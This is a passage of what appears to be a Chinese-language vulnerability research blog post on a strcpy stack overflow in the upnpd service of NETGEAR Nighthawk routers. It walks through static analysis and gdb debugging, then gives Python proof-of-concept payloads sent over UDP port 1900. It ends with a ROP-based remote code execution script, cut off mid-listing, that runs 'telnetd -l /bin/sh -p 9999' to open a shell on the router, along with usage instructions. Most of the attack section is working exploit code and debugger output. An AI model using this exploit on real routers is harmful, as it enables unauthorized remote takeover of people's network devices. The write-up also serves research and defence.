+<h2 id="0x03-静态分析"><a href="#0x03-静态分析" class="headerlink" title="0x03 静态分析"></a>0x03 静态分析</h2><p>该漏洞的原理是使用strcpy函数不当，拷贝过长字符导致缓冲区溢出，那么如何到达溢出位置。<br>首先upnpd服务在<code>sub_1D020()</code> 中使用<code>recvfrom()</code>从套接字接收UDP数据包，并捕获数据发送源的地址。从函数定义可知，upnpd接收了长度为0x1FFFF大小的数据到缓冲区v54</p>
+<blockquote>
+<p><strong>recvfrom</strong> recvfrom函数(经socket接收数据):</p>
+</blockquote>
+<blockquote>
+<p>函数原型:int recvfrom(SOCKET s,void <strong>*buf</strong>,int <strong>len</strong>,unsigned int flags, struct sockaddr <em>from,int </em>fromlen);</p>
+</blockquote>
+<blockquote>
+<p>相关函数 recv，recvmsg，send，sendto，socket</p>
+</blockquote>
+<blockquote>
+<p>函数说明:<a href="https://baike.baidu.com/item/recv%28%29" target="_blank" rel="noopener">recv()</a>用来接收远程主机经指定的socket传来的数据,并把数据传到由参数buf指向的内存空间,参数len为可接收数据的最大长度.参数flags一般设0,其他数值定义参考recv().参数from用来指定欲传送的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">网络地址</a>,结构sockaddr请参考bind()函数.参数fromlen为sockaddr的结构长度.</p>
+</blockquote>
+<p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083882/netgear/image_29.png" alt><br>在 <code>sub_25E04()</code> 中调用 <code>strcpy()</code> 将以上数据拷贝到大小为 <code>0x634 - 0x58 = 0x5dc</code> 的 buffer。如果超过缓冲区大小，数据就会覆盖栈底部分甚至返回地址。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083972/netgear/image_30.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">`                 ``+-----------------+`</span><br><span class="line">`                  ``|``     retaddr     ``|`</span><br><span class="line">`                  ``+-----------------+`</span><br><span class="line">`                 ``|``     saved ebp   ``|`</span><br><span class="line">`          ebp``---&gt;+-----------------+`</span><br><span class="line">`                 ``|``                 ``|`</span><br><span class="line">`                 ``|``                 ``|</span><br><span class="line">                 |                 |</span><br><span class="line">    s,ebp-0x58--&gt;+-----------------+`</span><br><span class="line">`                 ``|``                 ``|`</span><br><span class="line">`                 ``|``     buffer      ``|`</span><br><span class="line">`                 ``|``                 ``|`</span><br><span class="line">`                 ``|``                 ``|`</span><br><span class="line">` v40``,``ebp``-``0x634``--&gt;+-----------------+`</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-动态调试"><a href="#0x04-动态调试" class="headerlink" title="0x04 动态调试"></a>0x04 动态调试</h2><p>使用gdbserver调试目标程序<a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1568965448/gdbserver" target="_blank" rel="noopener">https://res.cloudinary.com/dozyfkbg3/raw/upload/v1568965448/gdbserver</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ps|grep upnp</span><br><span class="line"> 2714 0          3324 S   ./usr/sbin/upnpd</span><br><span class="line"> 2788 0          1296 S   grep upnp</span><br><span class="line"># ./gdbserver 127.0.0.1:12345 --attach 2714</span><br><span class="line">Attached; pid = 2714</span><br><span class="line">Listening on port 12345</span><br></pre></td></tr></table></figure>
+<p>工作机上使用跨平台试gdb-multiarch<br><code>gdb-multiarch -x dbgscript</code><br>dbgscript 内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`set`` architecture arm`</span><br><span class="line">`gef``-``remote ``-``q ``192.168``.2``.1``:``12345`</span><br><span class="line">`file usr``/``sbin``/``upnpd`</span><br><span class="line">`set`` remote ``exec``-``file ``/``usr``/``sbin``/upnpd`</span><br></pre></td></tr></table></figure>
+<p>直接构造溢出字符，程序不会正常返回，因为栈上存在一个v40的指针v51，需要覆盖为有效地址才能正确返回。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/image_23.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">p32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    0x634 * b&apos;a&apos; +</span><br><span class="line">    p32(0x43434343)</span><br><span class="line">)</span><br><span class="line">print(payload)</span><br><span class="line">s.connect((&apos;192.168.2.2&apos;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_24.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">p32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    0x604 * b&apos;a&apos; +  # dummy</span><br><span class="line">    p32(0x7e2da53c) +  # v51</span><br><span class="line">    (0x634 - 0x604 - 8) * b&apos;a&apos; +  # dummy</span><br><span class="line">    p32(0x43434343)  # LR</span><br><span class="line">)</span><br><span class="line">s.connect((&apos;192.168.2.2&apos;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，我们向返回地址发送的数据为0x43434343，但最后PC寄存器的值为0x43434342，最后一个bit变为0，这是为什么？<a href="https://blog.3or.de/arm-exploitation-defeating-dep-executing-mprotect.html" target="_blank" rel="noopener">https://blog.3or.de/arm-exploitation-defeating-dep-executing-mprotect.html</a></p>
+<ul>
+<li>首先溢出覆盖了非叶函数的返回地址。一旦这个函数执行它的结束语来恢复保存的值，保存的LR就被弹出到PC中返回给调用者。</li>
+<li>其次关于最低有效位的一个注意事项：BX指令将加载到PC的地址的LSB复制到CPSR寄存器的T状态位，CPSR寄存器在ARM和Thumb模式之间切换：ARM（LSB=0）/Thumb（LSB=1）。<ul>
+<li>我们可以看到R7300是运行在THUMB状态</li>
+<li>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节</li>
+<li>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节</li>
+</ul>
+</li>
+<li>因此保存的LR（用0x43434343覆盖）被弹出到PC中，然后弹出地址的LSB被写入CPSR寄存器T位（位5），最后PC本身的LSB被设置为0，从而产生0x43434342。</li>
+</ul>
+<p>最后检查程序的缓解措施。程序本身开启了NX，之前用过R7000的真机，设备开了ASLR<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_25.png" alt><br>在堆栈恢复前下一个断点，观察控制流转移情况，将PC指针控制为重启指令。通过 hook 的日志可以看到，ROP 利用链按照预期工作（由于模拟环境的问题，reboot 命令运行段错误了…）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gef➤ b *0x00025F40</span><br><span class="line">Breakpoint 1 at 0x25f40</span><br><span class="line"></span><br><span class="line">.text:00025F40                 ADD             SP, SP, #0x234</span><br><span class="line">.text:00025F44                 ADD             SP, SP, #0x400</span><br><span class="line">.text:00025F48                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span><br><span class="line"></span><br><span class="line">**.****text****:****0003E9DC** ****                LDR             R0, =aReboot_0 ; &quot;reboot&quot;</span><br><span class="line">.text:0003E9E0                 BL              system</span><br><span class="line"></span><br><span class="line">**payload如下：**</span><br><span class="line">payload = (</span><br><span class="line">    0x604 * b&apos;a&apos; +  # dummy</span><br><span class="line">    p32(0x76d9d450) +  # v41</span><br><span class="line">    (0x634 - 0x604 - 8) * b&apos;a&apos; +  # dummy</span><br><span class="line">    p32(0x0003E9DC)  # system(reboot)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">**固件模拟日志：**</span><br><span class="line">ssdp_http_method_check(203):</span><br><span class="line">ssdp_http_method_check(231):Http message error</span><br><span class="line">Detaching from process 3477</span><br><span class="line">rmmod: dhd.ko: No such file or directory</span><br><span class="line">**reboot: rmmod dhd failed: No such file or directory**</span><br><span class="line">**[0x0003e9e4] system(&apos;reboot&apos;) = 0**</span><br></pre></td></tr></table></figure>
+<p>综合目前的情况：</p>
+<ol>
+<li>目前可以控制<code>R4 - R11</code> 以及 <code>PC(R15)</code>寄存器</li>
+<li>开了 NX 不能用在栈上布置<code>shellcode</code>。</li>
+<li>有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 <code>gadget</code>。</li>
+<li><code>strcpy()</code> 函数导致的溢出，payload 中不能包含 <code>\x00</code> 字符。</li>
+</ol>
+<h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>路由器已启用ASLR缓解功能，我们可以使用ROP攻击绕过该功能。但是，我们通过使用对NULL字节敏感的<strong>strcpy</strong>来执行复制调用，这反过来又会阻止我们使用ROP攻击。因此，要利用包含NULL字节的地址，我们将需要使用堆栈重用攻击。即想办法提前将 ROP payload 注入目标内存。（<code>stack reuse</code>）<br>注意到recvfrom函数在接收 socket 数据时 buffer 未初始化，利用内存未初始化问题，我们可以向sub_1D020的堆栈中布置gadgets。构造如下 PoC，每个 payload 前添加 <code>\x00</code> 防止程序崩溃（strcpy遇到\x00截断，不会拷贝后面部分）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((&apos;192.168.2.2&apos;, 1900))</span><br><span class="line">s.send(b&apos;\x00&apos; + b&apos;A&apos; * 0x1ff0)</span><br><span class="line">s.send(b&apos;\x00&apos; + b&apos;B&apos; * 0x633)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>在strcpy下断点调试，并检查栈区内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info b</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">1       breakpoint     keep y   0x76dd6e48 &lt;recvfrom+4&gt;</span><br><span class="line">2       breakpoint     keep y   0x76dc350c &lt;strcpy+4&gt;</span><br><span class="line">4       breakpoint     keep y   0x00025e70</span><br><span class="line">5       breakpoint     keep y   0x00025e74</span><br><span class="line">gef➤  search-pattern BBBB</span><br><span class="line">[+] Searching &apos;BBBB&apos; in memory</span><br><span class="line">[+] In &apos;/lib/libc.so.0&apos;(0x76d85000-0x76dea000), permission=r-x</span><br><span class="line">  0x76de17e4 - 0x76de17e8  →   &quot;BBBB[...]&quot;</span><br><span class="line">  0x76de1ecc - 0x76de1edb  →   &quot;BBBBBBBBCCCCCCC&quot;</span><br><span class="line">  0x76de1ed0 - 0x76de1edb  →   &quot;BBBBCCCCCCC&quot;</span><br><span class="line">[+] In &apos;[stack]&apos;(0x7eb36000-0x7eb6f000), permission=rw-</span><br><span class="line">  **0x7eb6cc75** - 0x7eb6ccac  →   &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot;</span><br><span class="line">  0x7eb6cc79 - 0x7eb6ccb0  →   &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot;</span><br><span class="line">  0x7eb6cc7d - 0x7eb6ccb4  →   &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot;</span><br><span class="line">  0x7eb6cc81 - 0x7eb6ccb8  →   &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot;</span><br><span class="line">  0x7eb6cc85 - 0x7eb6ccbc  →   &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot;</span><br><span class="line">gef➤  x/s 0x7eb6cc75</span><br><span class="line">0x7eb6cc75:    &apos;B&apos; &lt;repeats 1587 times&gt;</span><br><span class="line">gef➤  x/s 0x7eb6cc75+1588</span><br><span class="line">0x7eb6d2a9:    &apos;A&apos; &lt;repeats 6588 times&gt;</span><br></pre></td></tr></table></figure>
+<p>此时程序上下文为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gef➤  context</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$r0  : 0x7eb6c5fc  →  0x00000000</span><br><span class="line">**$r1  : 0x7eb6cc74**  →  0x42424200</span><br><span class="line">$r2  : 0x1d      </span><br><span class="line">$r3  : 0x7eb6c5fc  →  0x00000000</span><br><span class="line">**$r4  : 0x7eb6cc74**  →  0x42424200</span><br><span class="line">$r5  : 0x0000cf02  →   blx 0x10c6586</span><br><span class="line">$r6  : 0x7eb6ecf4  →  &quot;192.168.2.1&quot;</span><br><span class="line">$r7  : 0x7eb6cc00  →  0x7eb6c5fc  →  0x00000000</span><br><span class="line">$r8  : 0x7eb6cc04  →  0x76f10020  →  0x00000000</span><br><span class="line">$r9  : 0x3eaf    </span><br><span class="line">$r10 : 0x1       </span><br><span class="line">$r11 : 0x000c4584  →  0x00000005</span><br><span class="line">$r12 : 0x00055450  →  0x76dc3508  →  &lt;strcpy+0&gt; mov r3,  r0</span><br><span class="line">$sp  : 0x7eb6c5d8  →  &quot;nnection:1&quot;</span><br><span class="line">$lr  : 0x00025e74  →   mov r0,  r7</span><br><span class="line">$pc  : 0x76dc350c  →  &lt;strcpy+4&gt; ldrb r2,  [r1],  #1</span><br><span class="line">$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x7eb6c5d8│+0x0000: &quot;nnection:1&quot;     ← $sp</span><br><span class="line">0x7eb6c5dc│+0x0004: &quot;tion:1&quot;</span><br><span class="line">0x7eb6c5e0│+0x0008: 0x0000313a (&quot;:1&quot;?)</span><br><span class="line">0x7eb6c5e4│+0x000c: 0x00000000</span><br><span class="line">0x7eb6c5e8│+0x0010: 0x00000000</span><br><span class="line">0x7eb6c5ec│+0x0014: 0x00000000</span><br><span class="line">0x7eb6c5f0│+0x0018: 0x00000000</span><br><span class="line">0x7eb6c5f4│+0x001c: 0x00000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────</span><br><span class="line">   0x76dc3500 &lt;strchrnul+24&gt;   bne    0x76dc34f0 &lt;strchrnul+8&gt;</span><br><span class="line">   0x76dc3504 &lt;strchrnul+28&gt;   bx     lr</span><br><span class="line">   0x76dc3508 &lt;strcpy+0&gt;       mov    r3,  r0</span><br><span class="line"> → 0x76dc350c &lt;strcpy+4&gt;       ldrb   r2,  [r1],  #1</span><br><span class="line">   0x76dc3510 &lt;strcpy+8&gt;       cmp    r2,  #0</span><br><span class="line">   0x76dc3514 &lt;strcpy+12&gt;      strb   r2,  [r3],  #1</span><br><span class="line">   0x76dc3518 &lt;strcpy+16&gt;      bne    0x76dc350c &lt;strcpy+4&gt;</span><br><span class="line">   0x76dc351c &lt;strcpy+20&gt;      bx     lr</span><br><span class="line">   0x76dc3520 &lt;strcspn+0&gt;      push   &#123;r4,  lr&#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;upnpd&quot;, stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x76dc350c → strcpy()</span><br><span class="line">[#1] 0x25e74 → mov r0,  r7</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>
+<p>由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。 这么大的空间，也足以给 ROP 的 payload 一片容身之地。</p>
+<p>使用 <code>strcpy</code> 调用在 bss 上拼接出命令字符串 <code>telnetd\x20-l/bin/sh\x20-p\x209999\x20&amp;\x20\x00</code>，并调整 R0 指向这段内存，然后跳转 <code>system</code> 执行即可。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_26.png" alt></p>
+<h2 id="0x06-脚本使用说明"><a href="#0x06-脚本使用说明" class="headerlink" title="0x06 脚本使用说明"></a><strong>0x06 脚本使用说明</strong></h2><table>
+<thead>
+<tr>
+<th>脚本帮助：</th>
+<th>usage: python2 PSV-2020-0211.py 【路由器IP】 【任意libc有效地址】</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>真实利用：</td>
+<td>IP:192.168.2.2 Port:upnp/1900</td>
+</tr>
+<tr>
+<td></td>
+<td><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083779/netgear/image_27.png" alt></td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">p32 = lambda x: pack(&quot;&lt;L&quot;, x)</span><br><span class="line">bssBase = 0x9E150   #string bss BASE Address</span><br><span class="line">ip = &apos;192.168.2.2&apos;</span><br><span class="line">libc_addr = 0x76d9d450</span><br><span class="line"></span><br><span class="line">def banner():</span><br><span class="line">    a= &quot;&quot;&quot;</span><br><span class="line">        # NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130</span><br><span class="line">        # Date : 2020.03.09</span><br><span class="line">        # POC : system(&quot;telnetd -l /bin/sh -p 9999&amp; &quot;) Execute</span><br><span class="line">        # Desc : execute telnetd to access router</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    print a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def makpayload2(libc_addr):</span><br><span class="line">    payload = (</span><br><span class="line">        0x604 * b&apos;a&apos; +  # dummy</span><br><span class="line">        p32(int(libc_addr,16)) +  # v51 Need to Existed Address</span><br><span class="line">        (0x634 - 0x604 - 8) * b&apos;a&apos; +  # dummy</span><br><span class="line">        p32(0x000230f0) + # #change eip LR=0x000230f0</span><br><span class="line">        2509 * b&apos;a&apos;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        .text:000230F0                 ADD             SP, SP, #0x20C</span><br><span class="line">        .text:000230F4                 ADD             SP, SP, #0x1000</span><br><span class="line">        .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">    )</span><br><span class="line">    print(len(payload))</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">def makpayload1():</span><br><span class="line">    expayload = &apos;&apos;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    .text:00013644                 MOV             R0, R10 ; dest</span><br><span class="line">    .text:00013648                 MOV             R1, R5  ; src</span><br><span class="line">    .text:0001364C                 BL              strcpy</span><br><span class="line">    .text:00013650                 MOV             R0, R4</span><br><span class="line">    .text:00013654                 ADD             SP, SP, #0x5C ; &apos;\&apos;</span><br><span class="line">    .text:00013658                 LDMFD           SP!, &#123;R4-R8,R10,PC&#125;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    expayload += &apos;a&apos; * 4550</span><br><span class="line">    expayload += p32(bssBase+3) # R4 Register</span><br><span class="line">    expayload += p32(0x3F340) # R5 Register //tel</span><br><span class="line">    expayload += &apos;IIII&apos; # R6 Register</span><br><span class="line">    expayload += &apos;HHHH&apos; # R7 Register</span><br><span class="line">    expayload += &apos;GGGG&apos; # R8 Register</span><br><span class="line">    expayload += &apos;FFFF&apos; # R9 Register</span><br><span class="line">    expayload += p32(bssBase) # R10 Register</span><br><span class="line">    expayload += &apos;BBBB&apos; # R11 Register</span><br><span class="line">    expayload += p32(0x13644) # strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+6) #R4</span><br><span class="line">    expayload += p32(0x423D7) #R5  //telnet</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+8) #R4</span><br><span class="line">    expayload += p32(0x40CA4 ) #R5  //telnetd\x20</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += 